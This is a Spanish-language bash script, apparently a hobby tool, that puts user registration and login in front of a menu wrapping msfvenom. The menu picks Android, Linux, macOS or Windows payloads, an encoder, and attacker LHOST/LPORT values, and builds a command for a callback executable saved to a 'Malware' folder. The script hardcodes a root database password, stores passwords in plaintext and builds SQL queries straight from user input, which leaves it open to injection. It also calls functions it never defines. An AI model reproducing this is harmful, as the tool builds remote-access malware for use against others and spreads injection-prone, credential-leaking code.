#!/bin/bash

default_path="/home/$USER/Desktop/Malware"
database="Generación_de_payload"

# Configuración de la base de datos en la nube
db_host="172.0.0.1"
db_port="3306"
db_name="generador"
db_user="root"
db_password="##itsalexito__FN"

check_admin() {
    if [[ $(id -u) != 0 ]]; then
        echo "Este script debe ejecutarse con privilegios de administrador."
        exit 1
    fi
}

check_mariadb() {
    if ! command -v mariadb &> /dev/null; then
        echo "MariaDB no está instalada. Se procederá con la instalación y configuración inicial."
        # Realizar la instalación y configuración de MariaDB en la nube según las instrucciones del proveedor
        # Puedes utilizar comandos como 'apt-get', 'yum' o el método proporcionado por el proveedor

        echo "MariaDB ha sido instalada y configurada correctamente."
    fi
}

create_database() {
    # Conexión a la base de datos en la nube utilizando los parámetros de configuración
    # Asegúrate de reemplazar los valores correspondientes
    sudo mariadb -h $db_host -P $db_port -u $db_user -p$db_password -e "CREATE DATABASE IF NOT EXISTS $db_name;"
    sudo mariadb -h $db_host -P $db_port -u $db_user -p$db_password -e "USE $db_name; CREATE TABLE IF NOT EXISTS users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(255), password VARCHAR(255));"
}

register_user() {
    read -p "Ingrese el nombre de usuario: " username
    read -s -p "Ingrese la contraseña: " password
    echo

    # Conexión a la base de datos en la nube para registrar el usuario
    sudo mariadb -h $db_host -P $db_port -u $db_user -p$db_password -e "USE $db_name; INSERT INTO users (username, password) VALUES ('$username', '$password');"
    echo "Usuario registrado correctamente."
}

login() {
    read -p "Ingrese el nombre de usuario: " username
    read -s -p "Ingrese la contraseña: " password
    echo

    # Conexión a la base de datos en la nube para verificar las credenciales del usuario
    result=$(sudo mariadb -h $db_host -P $db_port -u $db_user -p$db_password -e "USE $db_name; SELECT username FROM users WHERE username='$username' AND password='$password';")

    if [[ -n "$result" ]]; then
        echo "Inicio de sesión exitoso."
        return 0
    else
        echo "Credenciales inválidas. Inténtelo nuevamente."
        return 1
    fi
}

check_admin

check_mariadb

create_database

while true; do
    clear
    echo "Menú"
    echo "===="
    echo "1. Registrarse"
    echo "2. Iniciar sesión"
    echo "3. Salir"
    echo

    read -p "Seleccione una opción: " choice

    case $choice in
        1)
            register_user
            ;;
        2)
            if login; then
                echo "Inicio de sesión exitoso. ¡Bienvenido!"
                break
            fi
            ;;
        3)
            exit 0
            ;;
        *)
            echo "Opción inválida. Por favor, seleccione una opción válida."
            ;;
    esac

    read -p "Presione Enter para continuar..."
done

payloads=("Android" "Linux" "macOS" "Windows")

while true; do
    clear
    echo "Menú"
    echo "===="
    echo "1. Tabla de payloads"
    echo "2. Generar payload"
    echo "3. Salir"
    echo

    read -p "Seleccione una opción: " choice

    case $choice in
        1)
            list_payloads
            ;;
        2)
            clear
            echo "Selecciona la plataforma:"
            echo "========================"
            for i in "${!payloads[@]}"; do
                echo "$((i+1)). ${payloads[i]}"
            done
            echo

            read -p "Selecciona el número de plataforma: " platform_number

            if (( platform_number < 1 || platform_number > ${#payloads[@]} )); then
                echo "Plataforma inválida. Por favor, selecciona una opción válida."
                read -p "Presiona Enter para continuar..."
                continue
            fi

            platform=${payloads[platform_number-1]}

            clear
            echo "Payloads disponibles para $platform:"
            echo "=================================="
            payloads_list=$(msfvenom --list payloads | grep -E "${platform,,}/" | awk '{print NR, $0}')

            if [ -z "$payloads_list" ]; then
                echo "No hay payloads disponibles para la plataforma seleccionada."
                read -p "Presiona Enter para continuar..."
                continue
            fi

            echo "$payloads_list"
            echo

            read -p "Selecciona el número de payload: " payload_number
            selected_payload=$(echo "$payloads_list" | awk -v num=$payload_number 'NR==num{print $2}')

            if [ -z "$selected_payload" ]; then
                echo "Payload inválido. Por favor, selecciona una opción válida."
                read -p "Presiona Enter para continuar..."
                continue
            fi

            clear
            echo "Encoders disponibles:"
            echo "===================="
            encoders=$(msfvenom --list encoders | awk '{print NR, $0}')

            if [ -z "$encoders" ]; then
                echo "No hay encoders disponibles."
                read -p "Presiona Enter para continuar..."
                continue
            fi

            echo "$encoders"
            echo

            read -p "Selecciona el número de encoder: " encoder_number
            selected_encoder=$(echo "$encoders" | awk -v num=$encoder_number 'NR==num{print $2}')

            if [ -z "$selected_encoder" ]; then
                echo "Encoder inválido. Por favor, selecciona una opción válida."
                read -p "Presiona Enter para continuar..."
                continue
            fi

            read -p "LHOST: " lhost
            read -p "LPORT: " lport

            read -p "Nombre del archivo (sin extensión): " file

            if [ -z "$file" ]; then
                file="payload"
            fi

            file_with_extension="$file.exe"

            insert_payload "$selected_payload" "$lhost" "$lport" "$selected_encoder" "$file_with_extension" "$default_path/$file_with_extension"

            command="msfvenom -p $selected_payload LHOST=$lhost LPORT=$lport -e $selected_encoder -f exe -o $default_path/$file_with_extension"
            echo "Comando: $command"
            echo "Payload insertado correctamente en la base de datos."
            ;;
        3)
            exit 0
            ;;
        *)
            echo "Opción inválida. Por favor, selecciona una opción válida."
            ;;
    esac

    read -p "Presiona Enter para continuar..."
done
